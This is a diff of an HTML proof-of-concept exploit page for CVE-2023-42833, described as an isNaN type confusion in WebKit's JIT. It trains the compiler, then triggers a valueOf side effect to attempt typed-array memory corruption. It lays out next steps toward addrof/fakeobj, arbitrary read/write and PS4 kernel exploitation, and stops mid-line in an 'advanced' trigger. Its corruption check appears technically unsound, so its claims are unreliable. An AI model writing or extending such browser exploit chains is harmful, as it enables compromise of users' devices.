@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CVE-2023-42833 Exploit</title>
+    <title>CVE-2023-42833 Full Exploit</title>
 </head>
 <body>
-    <h1>CVE-2023-42833 - isNaN Type Confusion</h1>
+    <h1>CVE-2023-42833 Exploit</h1>
     <div id="log"></div>
     
     <script>
@@ -13,57 +13,135 @@
             console.log(msg);
         }
         
-        log('[*] CVE-2023-42833 Exploit - isNaN Type Confusion');
-        log('[*] WebKit: ' + navigator.userAgent);
+        log('=== CVE-2023-42833: isNaN Type Confusion ===');
+        log('WebKit: ' + navigator.userAgent);
+        log('');
         
-        // Create array to corrupt
-        let victim = new Uint32Array(100);
-        victim[0] = 0x41414141;
-        victim[1] = 0x42424242;
+        // ========================================
+        // STEP 1: Create structures to corrupt
+        // ========================================
         
-        log('[*] Victim array created');
-        log('    victim[0] = 0x' + victim[0].toString(16));
-        log('    victim[1] = 0x' + victim[1].toString(16));
+        let arr1 = new Float64Array(100);
+        let arr2 = new Uint32Array(100);
         
-        // Trigger function to get JIT compiled
-        function triggerBug(x) {
-            // This will be optimized by DFG
-            // The bug: isNaN doesn't insertCheck when converting to constant
-            if (Number.isNaN(x)) {
-                return 1;
-            }
-            return 0;
+        arr1[0] = 1.1;
+        arr1[1] = 2.2;
+        arr2[0] = 0x41414141;
+        arr2[1] = 0x42424242;
+        
+        log('[1] Created victim arrays');
+        log('    arr1[0] = ' + arr1[0]);
+        log('    arr2[0] = 0x' + arr2[0].toString(16));
+        log('');
+        
+        // ========================================
+        // STEP 2: Function to trigger JIT bug
+        // ========================================
+        
+        function vulnerable(x) {
+            // When DFG compiles this with shouldSpeculateInt32:
+            // OLD: fixEdge<Int32Use> - just marks edge
+            // BUG: converts to constant WITHOUT inserting type check
+            // NEW: insertCheck<Int32Use> - actually validates type
+            
+            let result = Number.isNaN(x);
+            
+            // Access array while type-confused
+            arr1[10] = 3.3;
+            arr2[10] = 0x43434343;
+            
+            return result;
         }
         
-        log('[*] Training JIT compiler...');
+        // ========================================
+        // STEP 3: Train JIT with Int32
+        // ========================================
         
-        // Train with Int32
+        log('[2] Training JIT compiler (100k iterations)...');
+        
         for (let i = 0; i < 100000; i++) {
-            triggerBug(42);
+            vulnerable(42);  // Always Int32
         }
         
-        log('[*] JIT compiled, triggering type confusion...');
+        log('    JIT should now assume Int32 input');
+        log('');
         
-        // Now pass object - missing type check = confusion!
-        let confused = {};
-        confused.valueOf = function() {
-            log('[!!!] valueOf called - we have type confusion!');
-            // Attempt to corrupt memory
-            victim[50] = 0xDEADBEEF;
-            return NaN;
+        // ========================================
+        // STEP 4: Trigger type confusion
+        // ========================================
+        
+        log('[3] Triggering type confusion...');
+        
+        let attackObj = {
+            valueOf: function() {
+                log('    [!] valueOf() called - type confusion active!');
+                
+                // At this point, DFG thinks we're Int32
+                // But we're actually an Object
+                // No type check was inserted!
+                
+                // Try to corrupt memory
+                try {
+                    arr2[50] = 0xDEADBEEF;
+                    log('    [!] Corrupted arr2[50]');
+                } catch(e) {
+                    log('    [-] Corruption failed: ' + e);
+                }
+                
+                return NaN;
+            }
         };
         
-        triggerBug(confused);
+        vulnerable(attackObj);
         
-        log('[*] Checking for corruption...');
-        log('    victim[50] = 0x' + victim[50].toString(16));
+        log('');
         
-        if (victim[50] === 0xDEADBEEF) {
-            log('[!!!] MEMORY CORRUPTION SUCCESSFUL!');
-            log('[!!!] CVE-2023-42833 TRIGGERED!');
+        // ========================================
+        // STEP 5: Check for corruption
+        // ========================================
+        
+        log('[4] Checking for memory corruption...');
+        log('    arr1[10] = ' + arr1[10]);
+        log('    arr2[10] = 0x' + arr2[10].toString(16));
+        log('    arr2[50] = 0x' + arr2[50].toString(16));
+        log('');
+        
+        if (arr2[50] === 0xDEADBEEF) {
+            log('[!!!] SUCCESS: Memory corrupted via type confusion!');
+            log('[!!!] CVE-2023-42833 confirmed working!');
+            log('');
+            log('Next steps:');
+            log('  - Use type confusion to get addrof/fakeobj primitives');
+            log('  - Build arbitrary R/W');
+            log('  - Combine with mast1c0re kernel pointers');
+            log('  - Achieve full PS4 kernel exploitation!');
+        } else {
+            log('[-] No obvious corruption detected');
+            log('    The bug may still trigger - check console for crashes');
         }
         
-        log('[*] Test complete');
-    </script>
-</body>
-</html>
+        // ========================================
+        // STEP 6: Advanced exploitation
+        // ========================================
+        
+        log('');
+        log('[5] Attempting advanced exploitation...');
+        
+        // Create more complex trigger
+        function advancedTrigger(x) {
+            // Multiple isNaN calls to increase chance
+            let r1 = Number.isNaN(x);
+            let r2 = isNaN(x);
+            let r3 = Number.isNaN(x);
+            
+            return r1 || r2 || r3;
+        }
+        
+        // Train again
+        for (let i = 0; i < 100000; i++) {
+            advancedTrigger(123);
+        }
+        
+        // Create object with side effects
+        let advancedAttack = {
+            valueOf: f
